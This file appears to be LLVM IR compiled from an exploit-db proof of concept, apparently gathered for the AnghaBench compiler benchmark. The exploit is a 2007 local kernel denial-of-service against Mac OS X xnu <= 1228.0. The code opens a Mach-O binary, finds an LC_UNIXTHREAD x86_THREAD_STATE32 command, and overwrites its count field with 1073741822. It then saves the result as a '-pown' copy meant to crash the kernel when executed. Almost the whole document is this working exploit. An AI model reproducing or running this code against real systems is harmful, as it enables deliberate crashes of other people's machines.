; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_4689.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_4689.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.stat = type { i32, i32 }
%struct.thread_command = type { i64, i64, i32 }

@MAX_PATH_LEN = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [127 x i8] c"Apple MACOS X xnu <= 1228.0 local kernel DoS PoC\0Aby: <mu-b@digit-labs.org>\0Ahttp://www.digit-labs.org/ -- Digit-Labs 2007!@$!\0A\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [28 x i8] c"Usage: %s <macho-o binary>\0A\00", align 1
@EXIT_SUCCESS = common dso_local global i32 0, align 4
@O_RDONLY = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [8 x i8] c"open ()\00", align 1
@EXIT_FAILURE = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [8 x i8] c"%s-pown\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [9 x i8] c"fstat ()\00", align 1
@.str.5 = private unnamed_addr constant [9 x i8] c"write ()\00", align 1
@LC_UNIXTHREAD = common dso_local global i64 0, align 8
@x86_THREAD_STATE32 = common dso_local global i64 0, align 8
@.str.6 = private unnamed_addr constant [27 x i8] c"* found at offset @0x%08X\0A\00", align 1
@.str.7 = private unnamed_addr constant [43 x i8] c"* ARGH! hueristic didn't find our target!\0A\00", align 1
@stdout = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [43 x i8] c"* done\0Aexecute ./%s at your own risk!$%%!\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i64, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i8*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca %struct.stat, align 4
  %16 = alloca %struct.thread_command*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %17 = load i32, i32* @MAX_PATH_LEN, align 4
  %18 = zext i32 %17 to i64
  %19 = call i8* @llvm.stacksave()
  store i8* %19, i8** %6, align 8
  %20 = alloca i8, i64 %18, align 16
  store i64 %18, i64* %7, align 8
  %21 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([127 x i8], [127 x i8]* @.str, i64 0, i64 0))
  %22 = load i32, i32* %4, align 4
  %23 = icmp sle i32 %22, 1
  br i1 %23, label %24, label %32

24:                                               ; preds = %2
  %25 = load i32, i32* @stderr, align 4
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i32 (i32, i8*, ...) @fprintf(i32 %25, i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.1, i64 0, i64 0), i8* %28)
  %30 = load i32, i32* @EXIT_SUCCESS, align 4
  %31 = call i32 @exit(i32 %30) #4
  unreachable

32:                                               ; preds = %2
  %33 = load i8**, i8*** %5, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = load i32, i32* @O_RDONLY, align 4
  %37 = call i32 @open(i8* %35, i32 %36)
  store i32 %37, i32* %11, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %43

39:                                               ; preds = %32
  %40 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0))
  %41 = load i32, i32* @EXIT_FAILURE, align 4
  %42 = call i32 @exit(i32 %41) #4
  unreachable

43:                                               ; preds = %32
  %44 = trunc i64 %18 to i32
  %45 = load i8**, i8*** %5, align 8
  %46 = getelementptr inbounds i8*, i8** %45, i64 1
  %47 = load i8*, i8** %46, align 8
  %48 = call i32 @snprintf(i8* %20, i32 %44, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.3, i64 0, i64 0), i8* %47)
  %49 = load i32, i32* @O_RDWR, align 4
  %50 = load i32, i32* @O_CREAT, align 4
  %51 = or i32 %49, %50
  %52 = call i32 @open(i8* %20, i32 %51)
  store i32 %52, i32* %12, align 4
  %53 = icmp eq i32 %52, -1
  br i1 %53, label %54, label %58

54:                                               ; preds = %43
  %55 = call i32 @perror(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0))
  %56 = load i32, i32* @EXIT_FAILURE, align 4
  %57 = call i32 @exit(i32 %56) #4
  unreachable

58:                                               ; preds = %43
  %59 = load i32, i32* %11, align 4
  %60 = call i64 @fstat(i32 %59, %struct.stat* %15)
  %61 = icmp slt i64 %60, 0
  br i1 %61, label %62, label %66

62:                                               ; preds = %58
  %63 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.4, i64 0, i64 0))
  %64 = load i32, i32* @EXIT_FAILURE, align 4
  %65 = call i32 @exit(i32 %64) #4
  unreachable

66:                                               ; preds = %58
  %67 = getelementptr inbounds %struct.stat, %struct.stat* %15, i32 0, i32 0
  %68 = load i32, i32* %67, align 4
  store i32 %68, i32* %14, align 4
  %69 = load i32, i32* %14, align 4
  %70 = sext i32 %69 to i64
  %71 = mul i64 1, %70
  %72 = trunc i64 %71 to i32
  %73 = call i8* @xmalloc(i32 %72)
  store i8* %73, i8** %8, align 8
  %74 = load i8*, i8** %8, align 8
  %75 = load i32, i32* %14, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds i8, i8* %74, i64 %76
  store i8* %77, i8** %10, align 8
  %78 = load i32, i32* %11, align 4
  %79 = load i8*, i8** %8, align 8
  %80 = load i32, i32* %14, align 4
  %81 = call i32 @read(i32 %78, i8* %79, i32 %80)
  %82 = load i32, i32* %14, align 4
  %83 = icmp slt i32 %81, %82
  br i1 %83, label %84, label %89

84:                                               ; preds = %66
  %85 = call i32 @unlink(i8* %20)
  %86 = call i32 @perror(i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0))
  %87 = load i32, i32* @EXIT_FAILURE, align 4
  %88 = call i32 @exit(i32 %87) #4
  unreachable

89:                                               ; preds = %66
  %90 = load i32, i32* %11, align 4
  %91 = call i32 @close(i32 %90)
  %92 = load i8*, i8** %8, align 8
  store i8* %92, i8** %9, align 8
  store i32 0, i32* %13, align 4
  br label %93

93:                                               ; preds = %127, %89
  %94 = load i32, i32* %13, align 4
  %95 = icmp ne i32 %94, 0
  br i1 %95, label %101, label %96

96:                                               ; preds = %93
  %97 = load i8*, i8** %9, align 8
  %98 = getelementptr inbounds i8, i8* %97, i64 24
  %99 = load i8*, i8** %10, align 8
  %100 = icmp ult i8* %98, %99
  br label %101

101:                                              ; preds = %96, %93
  %102 = phi i1 [ false, %93 ], [ %100, %96 ]
  br i1 %102, label %103, label %130

103:                                              ; preds = %101
  %104 = load i8*, i8** %9, align 8
  %105 = bitcast i8* %104 to %struct.thread_command*
  store %struct.thread_command* %105, %struct.thread_command** %16, align 8
  %106 = load %struct.thread_command*, %struct.thread_command** %16, align 8
  %107 = getelementptr inbounds %struct.thread_command, %struct.thread_command* %106, i32 0, i32 0
  %108 = load i64, i64* %107, align 8
  %109 = load i64, i64* @LC_UNIXTHREAD, align 8
  %110 = icmp eq i64 %108, %109
  br i1 %110, label %111, label %126

111:                                              ; preds = %103
  %112 = load %struct.thread_command*, %struct.thread_command** %16, align 8
  %113 = getelementptr inbounds %struct.thread_command, %struct.thread_command* %112, i32 0, i32 1
  %114 = load i64, i64* %113, align 8
  %115 = load i64, i64* @x86_THREAD_STATE32, align 8
  %116 = icmp eq i64 %114, %115
  br i1 %116, label %117, label %126

117:                                              ; preds = %111
  %118 = load %struct.thread_command*, %struct.thread_command** %16, align 8
  %119 = getelementptr inbounds %struct.thread_command, %struct.thread_command* %118, i32 0, i32 2
  store i32 1073741822, i32* %119, align 8
  %120 = load i8*, i8** %9, align 8
  %121 = load i8*, i8** %8, align 8
  %122 = ptrtoint i8* %120 to i64
  %123 = ptrtoint i8* %121 to i64
  %124 = sub i64 %122, %123
  %125 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.6, i64 0, i64 0), i64 %124)
  store i32 1, i32* %13, align 4
  br label %126

126:                                              ; preds = %117, %111, %103
  br label %127

127:                                              ; preds = %126
  %128 = load i8*, i8** %9, align 8
  %129 = getelementptr inbounds i8, i8* %128, i64 8
  store i8* %129, i8** %9, align 8
  br label %93

130:                                              ; preds = %101
  %131 = load i32, i32* %13, align 4
  %132 = icmp ne i32 %131, 0
  br i1 %132, label %139, label %133

133:                                              ; preds = %130
  %134 = call i32 @unlink(i8* %20)
  %135 = load i32, i32* @stderr, align 4
  %136 = call i32 (i32, i8*, ...) @fprintf(i32 %135, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.7, i64 0, i64 0))
  %137 = load i32, i32* @EXIT_FAILURE, align 4
  %138 = call i32 @exit(i32 %137) #4
  unreachable

139:                                              ; preds = %130
  %140 = load i32, i32* %12, align 4
  %141 = load i8*, i8** %8, align 8
  %142 = load i32, i32* %14, align 4
  %143 = call i32 @write(i32 %140, i8* %141, i32 %142)
  %144 = load i32, i32* %12, align 4
  %145 = getelementptr inbounds %struct.stat, %struct.stat* %15, i32 0, i32 1
  %146 = load i32, i32* %145, align 4
  %147 = call i32 @fchmod(i32 %144, i32 %146)
  %148 = load i32, i32* %12, align 4
  %149 = call i32 @close(i32 %148)
  %150 = load i8*, i8** %8, align 8
  %151 = call i32 @free(i8* %150)
  %152 = load i32, i32* @stdout, align 4
  %153 = call i32 (i32, i8*, ...) @fprintf(i32 %152, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.8, i64 0, i64 0), i8* %20)
  %154 = load i32, i32* @EXIT_SUCCESS, align 4
  store i32 %154, i32* %3, align 4
  %155 = load i8*, i8** %6, align 8
  call void @llvm.stackrestore(i8* %155)
  %156 = load i32, i32* %3, align 4
  ret i32 %156
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local i32 @printf(i8*, ...) #2

declare dso_local i32 @fprintf(i32, i8*, ...) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #3

declare dso_local i32 @open(i8*, i32) #2

declare dso_local i32 @perror(i8*) #2

declare dso_local i32 @snprintf(i8*, i32, i8*, i8*) #2

declare dso_local i64 @fstat(i32, %struct.stat*) #2

declare dso_local i8* @xmalloc(i32) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i32 @unlink(i8*) #2

declare dso_local i32 @close(i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

declare dso_local i32 @fchmod(i32, i32) #2

declare dso_local i32 @free(i8*) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
